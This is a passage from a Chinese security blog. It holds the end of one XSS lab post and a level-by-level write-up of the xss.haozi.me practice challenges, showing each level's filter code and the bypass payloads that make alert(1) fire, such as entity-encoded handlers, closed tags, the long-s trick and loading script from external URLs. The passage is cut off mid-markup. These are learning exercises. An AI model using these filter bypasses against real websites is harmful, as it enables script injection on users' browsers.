class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);<span class="hljs-variable">$str5</span>=str_replace(<span class="hljs-string">&quot;    &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>本题不仅过滤了script,还过滤了空格,因此使用其他其他DOM事件且使用一下制符替换空格即可</p><table><thead><tr><th>制符</th><th>URL编码</th></tr></thead><tbody><tr><td>换行(LF) : LineFeed</td><td>%0A</td></tr><tr><td>回车(CR) : CreTurn</td><td>%0D</td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs js">payload:<span class="xml">&lt;img%0asrc=x%0aonerror=alert(1)&gt;</span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> 靶机练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS弹窗练习 ：xss.haozi.me</title>
      <link href="/Study/post/XSS-Exercise-1/"/>
      <url>/Study/post/XSS-Exercise-1/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS弹窗闯关练习"><a href="#XSS弹窗闯关练习" class="headerlink" title="XSS弹窗闯关练习"></a>XSS弹窗闯关练习</h1><br><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是一个xss弹窗练习平台，让你一个点一个点的理解 XSS。页面上展现了源码，方便直接，更易理解其原理。</p><blockquote><p>平台地址: <a href="https://xss.haozi.me/#/">https://xss.haozi.me/#/</a></p></blockquote><p>首次进去需要输入一个昵称,且提醒你<code>请在 input code 框内输入代码，以至弹出 alert(1) 为过关</code></p><br><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre></div><p>服务器端没有任何过滤直接执行JavaScript代码即可</p><div class="code-wrapper"><pre><code class="hljs js">payload:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-01.png"></p><br><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/textarea&gt;&#x27;</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span></code></pre></div><p>服务器虽然没有进行过滤,但是前端的<code>textarea</code>标签会将JavaScript代码文本化直接输出，所以添加一个结束标签凑成一对就能绕过</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:&lt;<span class="hljs-regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-02.png"></p><br><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span></code></pre></div><p>服务器依旧没有进行过滤,不过这次代码插入在<code>input</code>标签下的<code>value</code>属性下,依旧会吧JavaScript代码文本化直接输出,因此将<code>value的双引号</code>和<code>input的右尖括号</code>补全 即可绕过</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:<span class="hljs-string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-03.png"></p><br><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()]/g</span>  input = input.replace(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-keyword">return</span> input&#125;</code></pre></div><p>这题服务器终于对JavaScript代码进行过滤了,使用是正则表达式匹配,如果匹配成功就替换成空</p><ul><li>正则表达式<code>/[()]/g</code></li><li>末尾的g是<code>全局匹配</code></li><li>两条斜杠是代表<code>开始与结束的位置</code></li><li>方括号是表示匹配<code>方括号中的任意字符</code></li><li>这个正则表达式的意思就是,全局匹配<code>左括号和有括号</code></li></ul><p>染过方法有很多</p><div class="code-wrapper"><pre><code class="hljs html">payload:可用反引号代替括号<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert</span>`<span class="hljs-attr">1</span>`&gt;</span>可用Html实体编码表示左右括号<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;lpar;1&amp;rpar;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#40;1&amp;#41;</span>&gt;</span><span class="hljs-symbol">&amp;lpar;</span>和<span class="hljs-symbol">&amp;#40;</span>表示左括号(<span class="hljs-symbol">&amp;rpar;</span>和<span class="hljs-symbol">&amp;#41;</span>表示右括号)可以引用外部js文件<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://xss.haozi.me/j.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-04.png"></p><br><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()`]/g</span>  input = input.replace(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-keyword">return</span> input&#125;</code></pre></div><p>这题和0x03很像,就是正则表达式多了个反引号检测,所以0x03的payload除了第一条,其他都能用</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-05.png"></p><br><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  input = input.replace(<span class="hljs-regexp">/--&gt;/g</span>, <span class="hljs-string">&#x27;😂&#x27;</span>)  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;!-- &#x27;</span> + input + <span class="hljs-string">&#x27; --&gt;&#x27;</span>&#125;前端代码:&lt;!--  --&gt;</code></pre></div><p>服务器使用正则表达式进行了过滤,<code>--&gt;</code>被替换成😂,然而<code>&lt;!--</code>与<code>--&gt;</code>组成一个HTML注释,但是HTML还有一种与能与<code>&lt;!--</code>组成,就是<code>--!&gt;</code>,HTML会自动转为<code>--&gt;</code></p><div class="code-wrapper"><pre><code class="hljs javascript">payload:--!&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-06.png"></p><br><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  input = input.replace(<span class="hljs-regexp">/auto|on.*=|&gt;/ig</span>, <span class="hljs-string">&#x27;_&#x27;</span>)  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;input value=1 <span class="hljs-subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span></span></code></pre></div><p>服务器依旧使用正则表达式过滤,把<code>auto</code>、<code>&gt;</code>、<code>on来头=结尾</code>,正则表达式的<code>i</code>是<code>不区分大小写</code>,但是正则表达式没有过滤换行</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:onclick=alert(<span class="hljs-number">1</span>)单机文本框即可触发JavaScript代码</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-07.png"></p><br><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-keyword">const</span> stripTagsRe = <span class="hljs-regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>  input = input.replace(stripTagsRe, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;article&gt;<span class="hljs-subst">$&#123;input&#125;</span>&lt;/article&gt;`</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span></span></code></pre></div><p>服务器使用正则表达式,对<code>&lt;&gt;</code>括起来的内容进行过滤替换成空,但是由于<code>HTML</code>的容错性极高,所以,对于不闭合也能接受</p><div class="code-wrapper"><pre><code class="hljs html">payload:<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span></span><span class="hljs-tag">     后面加\\ 空格 回车 才能触发</span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-08.png"></p><br><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">src</span>) </span>&#123;  src = src.replace(<span class="hljs-regexp">/&lt;\/style&gt;/ig</span>, <span class="hljs-string">&#x27;/* \u574F\u4EBA */&#x27;</span>)  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span><span class="hljs-string">    &lt;style&gt;</span><span class="hljs-string">      <span class="hljs-subst">$&#123;src&#125;</span></span><span class="hljs-string">    &lt;/style&gt;</span><span class="hljs-string">  `</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="xml"></span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span></code></pre></div><p>服务器正则表达式过滤了我们想要闭合的<code>style标签</code>,且忽略了大小写,但是正则表达式是以一个整体来判断,所以在style闭合标签里面加入空格,就能绕过</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:&lt;/style &gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span> alert(1) <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-09.png"></p><br><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-keyword">let</span> domainRe = <span class="hljs-regexp">/^https?:\/\/www\.segmentfault\.com/</span>  <span class="hljs-keyword">if</span> (domainRe.test(input)) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span>  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span>&#125;前端代码:Invalid URL</code></pre></div><p>服务器使用正则表达式限制了,必须使用<code>https://www.sogmentfault.com</code>开头,且放在<code>script</code>标签的<code>src</code>属性里面.所以我们需要闭合绕过</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:https:<span class="hljs-comment">//www.segmentfault.com&quot;&gt;&lt;/script&gt;</span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://xss.haozi.me/j.js&quot;</span></span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-10.png"></p><br><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;    <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)            .replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>)            .replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)            .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)            .replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)            .replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;&amp;#x2f&#x27;</span>)  &#125;  <span class="hljs-keyword">const</span> domainRe = <span class="hljs-regexp">/^https?:\/\/www\.segmentfault\.com/</span>  <span class="hljs-keyword">if</span> (domainRe.test(input)) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span>  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span>&#125;前端代码:Invalid URL</code></pre></div><p>和<code>0x09</code>一样需要制定的Url开头,但是本题还将”&amp;、`、”、&lt;、&gt;、&quot;这些标点符号全部转换成HTML实体编码.因此本题不能通过闭合绕过,需要用到HTML的@特性,请求Url: <a href="http://www.google.com@www.youtube.com/">www.google.com@www.youtube.com</a> 最后访问到是 YouTube , Google相当于做了一次跳转  </p><div class="code-wrapper"><pre><code class="hljs javascript">payload:https:<span class="hljs-comment">//www.segmentfault.com@xss.haozi.me/j.js</span></code></pre></div><p><code>注意:由于Chrome浏览器的一些安全机制,无法正常请求这个Url,所以这题改为使用Firefox浏览器</code></p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-11.png"></p><br><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  input = input.toUpperCase()  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;h1&gt;<span class="hljs-subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span></code></pre></div><p>这关使用了<code>toUpperCase</code>函数对输入的字符进行大写转换,HTML标签不区分大小写,但是JavaScript代码区分,也就是说<code>ALERT</code>不能执行.但是可以将JavaScript代码进行<code>uniocde</code>编码进行绕过</p><p><code>注意Unicode编码有两种结果,一个是中文转Unicode结果是\u开头的,另一个是ASCII转Unicode结果是&amp;#开头的.这里用ASCII转Unicode</code></p><div class="code-wrapper"><pre><code class="hljs html">payload:<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>&gt;</span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-12.png"></p><br><h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  input = input.replace(<span class="hljs-regexp">/script/ig</span>, <span class="hljs-string">&#x27;&#x27;</span>)  input = input.toUpperCase()  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span></code></pre></div><p>服务器使用正则表达式将<code>script</code>替换成空,且对输入的字符进行大写转换,使用<code>0x0B</code>的payload即可,不要相信网上用外部引入<code>j.js</code>,因为转为大写不存在这个文件</p><div class="code-wrapper"><pre><code class="hljs html">payload:<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span>&gt;</span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-13.png"></p><br><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  input = input.replace(<span class="hljs-regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span><span class="hljs-string">    &lt;script&gt;</span><span class="hljs-string">          // alert(&#x27;<span class="hljs-subst">$&#123;input&#125;</span>&#x27;)</span><span class="hljs-string">    &lt;/script&gt;</span><span class="hljs-string">  `</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><span class="javascript"><span class="xml">          <span class="hljs-comment">// alert(&#x27;&#x27;)</span></span></span><span class="javascript"><span class="xml">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div><p>服务器使用正则表达式对 <code>&lt; / &quot; &#39; </code>进行过滤替换成空,且在输入的地方进行单行注释,因为是单行注释所以换行就能绕过,但是由于后面接着<code>&#39;)</code>,所以必须屏蔽或闭合才能执行JavaScript代码,根据服务器端代码,只能使用 <code>--&gt;</code>来进行注释</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:(注意有一行空行)alert(<span class="hljs-number">1</span>)--&gt;</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-14.png"></p><br><h2 id="0x0E-巨坑"><a href="#0x0E-巨坑" class="headerlink" title="0x0E(巨坑!!!)"></a>0x0E(巨坑!!!)</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  input = input.replace(<span class="hljs-regexp">/&lt;([a-zA-Z])/g</span>, <span class="hljs-string">&#x27;&lt;_$1&#x27;</span>)  input = input.toUpperCase()  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span></code></pre></div><p>服务器使用正则表达式对以<code>&lt;</code>开头后面接大小写字母进行替换成<code>&lt;_</code>加大写字母,导致无法使用<code>script</code>标签,且大写的JavaScript代码无法执行,没有丝毫头绪,翻了下官方WP,了解到一些骚知识</p><p><code>ſ</code>是古英语中的s的写法, 转成大写是正常的<code>S</code></p><p><code>这也太骚了吧!!!,玩CTF吗???脑洞这么大</code></p><p><code>又是一个坑!!!,官方WP是引入j.js 由于大写转换后变成J.JS.文件不存在访问404.只能去自己的服务器写脚本引入自己的js文件</code></p><div class="code-wrapper"><pre><code class="hljs javascript">payload:&lt;ſcript src=<span class="hljs-string">&quot;http://自己的服务器/ALERT.JS&quot;</span>&gt;&lt;/script&gt;ALERT.JS:alert(<span class="hljs-number">1</span>)</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-15.png"></p><br><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span class="hljs-params">s</span>) </span>&#123;    <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>)            .replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>)            .replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>)            .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>)            .replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>)            .replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;&amp;#x2f;&#x27;</span>)  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="hljs-subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;console.error(&#x27;&#x27;)&quot;</span>&gt;</span></span></code></pre></div><p>服务器对<code>&amp; &#39; &quot; &lt; &gt; \</code>进行HTML实体编码,但是在HTML标签里面使用HTML实体编码没啥用,因为浏览器会解析HTML实体编码,所以将<code>onerror的console.error闭合</code>绕过就行了</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:<span class="hljs-string">&#x27;)alert(&#x27;</span><span class="hljs-number">1</span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-16.png"></p><br><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span><span class="hljs-string">&lt;script&gt;</span><span class="hljs-string">  window.data = <span class="hljs-subst">$&#123;input&#125;</span></span><span class="hljs-string">&lt;/script&gt;</span><span class="hljs-string">  `</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><span class="javascript"><span class="xml">  <span class="hljs-built_in">window</span>.data =</span></span><span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div><p>送分题???没有任何过滤,能直接执行alert(1)</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:alert(<span class="hljs-number">1</span>)</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-17.png"></p><br><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-comment">// from alf.nu</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">s</span>) </span>&#123;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeJs</span> (<span class="hljs-params">s</span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">String</span>(s)            .replace(<span class="hljs-regexp">/\\/g</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>)            .replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>)            .replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)            .replace(<span class="hljs-regexp">/`/g</span>, <span class="hljs-string">&#x27;\\`&#x27;</span>)            .replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;\\74&#x27;</span>)            .replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;\\76&#x27;</span>)            .replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>)            .replace(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">&#x27;\\n&#x27;</span>)            .replace(<span class="hljs-regexp">/\r/g</span>, <span class="hljs-string">&#x27;\\r&#x27;</span>)            .replace(<span class="hljs-regexp">/\t/g</span>, <span class="hljs-string">&#x27;\\t&#x27;</span>)            .replace(<span class="hljs-regexp">/\f/g</span>, <span class="hljs-string">&#x27;\\f&#x27;</span>)            .replace(<span class="hljs-regexp">/\v/g</span>, <span class="hljs-string">&#x27;\\v&#x27;</span>)            <span class="hljs-comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span>            .replace(<span class="hljs-regexp">/\0/g</span>, <span class="hljs-string">&#x27;\\0&#x27;</span>)  &#125;  s = escapeJs(s)  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span><span class="hljs-string">&lt;script&gt;</span><span class="hljs-string">  var url = &#x27;javascript:console.log(&quot;<span class="hljs-subst">$&#123;s&#125;</span>&quot;)&#x27;</span><span class="hljs-string">  var a = document.createElement(&#x27;a&#x27;)</span><span class="hljs-string">  a.href = url</span><span class="hljs-string">  document.body.appendChild(a)</span><span class="hljs-string">  a.click()</span><span class="hljs-string">&lt;/script&gt;</span><span class="hljs-string">`</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><span class="javascript"><span class="xml">  <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;javascript:console.log(&quot;&quot;)&#x27;</span></span></span><span class="javascript"><span class="xml">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;a&#x27;</span>)</span></span><span class="javascript"><span class="xml">  a.href = url</span></span><span class="javascript"><span class="xml">  <span class="hljs-built_in">document</span>.body.appendChild(a)</span></span><span class="javascript"><span class="xml">  a.click()</span></span><span class="javascript"><span 